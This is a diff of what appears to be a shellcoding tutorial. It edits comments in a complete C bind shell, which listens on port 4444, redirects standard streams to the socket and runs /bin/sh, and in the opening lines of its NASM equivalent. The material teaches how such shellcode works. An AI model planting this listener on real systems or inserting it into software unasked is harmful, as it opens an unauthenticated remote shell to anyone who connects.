@@ -40,36 +40,36 @@ This will be used as a template for the low-level assembly code to follow:
 #include <sys/socket.h>  
 #include <netinet/in.h>  
   
-int host_sockid;    // socket for host  
+int host_sockid;  // socket for host  
 int client_sockid;  // socket for client  
       
 struct sockaddr_in hostaddr;  // sockaddr struct  
   
 int main()  
 {  
-    // Create socket  
+    // 1st syscall - create socket  
     host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
   
-    // Initialize sockaddr struct to bind socket using port 4444  
-    hostaddr.sin_family = AF_INET;  
-    hostaddr.sin_port = htons(4444);  
-    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  
+    // Create sockaddr struct 
+    hostaddr.sin_family = AF_INET;  // consists of AF_INET
+    hostaddr.sin_port = htons(4444);  // bind socket using port 4444  
+    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  // listen on any interface
   
-    // Bind socket to IP/Port in sockaddr struct  
+    // 2nd syscall - bind socket to IP/Port in sockaddr struct  
     bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
       
-    // Listen for incoming connections  
+    // 3rd syscall - listen for incoming connections  
     listen(host_sockid, 2);  
   
-    // Accept incoming connection using the socket created  
+    // 4th syscall - accept incoming connections using the socket created  
     client_sockid = accept(host_sockid, NULL, NULL);  
   
-    // Duplicate file descriptors for STDIN, STDOUT and STDERR  
+    // 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR  
     dup2(client_sockid, 0);  
     dup2(client_sockid, 1);  
     dup2(client_sockid, 2);  
   
-    // Execute /bin/sh  
+    // 6th syscall - executes /bin/sh using execve  
     execve("/bin/sh", NULL, NULL);  
     close(host_sockid);  
       
@@ -166,7 +166,7 @@ xor edx, edx
 Next step is to create the socket syscall
 
 ```nasm
-; create socket
+; 1st syscall - create socket
 mov bl, 2       ; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h
 mov cl, 1       ; setting up SOCK_STREAM, as seen in C code and pulled from /usr/include/i386-linux-gnu/bits/socket_type.h
 mov dl, 6       ; setting protocol again as in C code, pulled from /usr/include/linux/netinet/in.h
